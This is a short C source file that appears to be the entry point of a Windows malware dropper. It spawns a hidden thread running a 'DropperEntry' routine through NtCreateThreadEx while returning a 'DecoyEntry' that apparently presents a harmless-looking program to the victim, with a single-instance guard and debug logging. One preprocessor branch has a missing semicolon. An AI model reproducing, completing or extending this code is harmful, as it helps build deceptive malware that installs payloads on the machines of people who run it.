#include <core\config.h>
#include <core\ldr.h>
#include <core\ntapi.h>
#include <core\instance.h>
#include <crypto\crc32.h>
#include <dropper\entry.h>
#include <decoy\entry.h>

ULONG
WINAPI
InitialEntry(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD0);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    if (!InitConfig()) {
        return 0;
    }

    if(!LdrLoadNtapi()) {
        return 0;
    }

    InitCrc32();

#if SCFG_IGNORE_ISTANCE == ON
    CreateInstance()

    if (TRUE) {
#else
    if (CreateInstance()) {
#endif
        HANDLE hThread;

        if (!NT_ERROR(NtCreateThreadEx(
            &hThread,
            STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
            NULL,
            NtCurrentProcess(),
            DropperEntry,
            (PVOID)RTLP_LCG_NATIVE,
            0,
            0,
            PAGE_SIZE,
            PAGE_SIZE,
            NULL
        ))) {
            $DLOG1(DLG_FLT_DEFAULT, "Dropper started!");
        } else {
            $DLOG1(DLG_FLT_CRITICAL, "Failed to start dropper on new thread!");
        }
    }

    return DecoyEntry();
}
